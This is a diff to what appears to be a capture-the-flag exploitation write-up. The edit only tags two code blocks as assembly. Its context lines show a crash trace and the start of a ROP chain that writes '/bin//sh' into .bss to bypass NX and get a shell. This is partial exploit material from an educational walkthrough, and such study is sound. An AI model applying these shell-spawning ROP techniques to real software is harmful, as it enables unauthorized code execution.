@@ -119,7 +119,7 @@ def pwn(s):
 
 We try again, and we hit the SIGSEGV in the RET. Perfect, time to bypass NX.
 
-```
+```asm
 Program received signal SIGSEGV, Segmentation fault.
 [...]
 0x40157c	 <main+505>  mov    edi,eax
@@ -139,7 +139,7 @@ writable address, and write '/bin//sh' (we arbitrarily chose 0x6c3110 in the
 `.bss`). Using [`ropgadget`](https://github.com/JonathanSalwan/ROPgadget) makes
 it easier than ever:
 
-```
+```asm
 0x401c87:                  # pop rsi ; ret
 0x6c3110:                  # our writable address
 0x44db34:                  # pop rax ; ret
